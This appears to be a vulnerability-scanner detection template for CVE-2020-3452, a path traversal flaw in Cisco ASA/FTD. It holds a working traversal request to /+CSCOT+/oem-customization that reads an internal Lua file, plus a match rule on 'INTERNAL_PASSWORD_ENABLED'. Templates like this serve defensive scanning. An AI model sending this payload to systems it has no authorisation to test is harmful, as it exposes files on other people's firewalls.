name: yaml-poc-cisco-adaptive_security_appliance-directory_traversal-CVE-2020-3452
binding: 8575f338-8dba-4db7-9e88-2af4ec856b0e
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/158646/Cisco-ASA-FTD-Remote-File-Disclosure.html
        - http://packetstormsecurity.com/files/158647/Cisco-Adaptive-Security-Appliance-Software-9.11-Local-File-Inclusion.html
        - http://packetstormsecurity.com/files/159523/Cisco-ASA-FTD-9.6.4.42-Path-Traversal.html
        - http://packetstormsecurity.com/files/160497/Cisco-ASA-9.14.1.10-FTD-6.6.0.1-Path-Traversal.html
        - http://www.nsfocus.net/vulndb/47633
        - http://www.nsfocus.net/vulndb/49091
        - https://nvd.nist.gov/vuln/detail/CVE-2020-3452
        - https://packetstormsecurity.com/files/158646/Cisco-ASA-FTD-Remote-File-Disclosure.html
        - https://packetstormsecurity.com/files/158647/Cisco-Adaptive-Security-Appliance-Software-9.11-Local-File-Inclusion.html
        - https://packetstormsecurity.com/files/159523/Cisco-ASA-FTD-9.6.4.42-Path-Traversal.html
        - https://packetstormsecurity.com/files/160497/Cisco-ASA-9.14.1.10-FTD-6.6.0.1-Path-Traversal.html
        - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86
        - https://vigilance.fr/vulnerability/Cisco-ASA-directory-traversal-via-HTTP-Requests-32899
        - https://www.auscert.org.au/bulletins/ESB-2020.2522.2/
        - https://www.auscert.org.au/bulletins/ESB-2020.2522.4/
        - https://www.auscert.org.au/bulletins/ESB-2020.2522.5/
        - https://www.auscert.org.au/bulletins/ESB-2020.2522/
        - https://www.exploit-db.com/exploits/48722
        - https://www.exploit-db.com/exploits/48871
    vulnerability:
        id: 4c536b70-02a8-4e5a-bfdb-7d3e0bd71e03
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
            follow_redirects: false
        expression: response.status == 200 && response.headers["Content-Type"] == "application/octet-stream" && response.body.bcontains(b"INTERNAL_PASSWORD_ENABLED")
expression: r0()
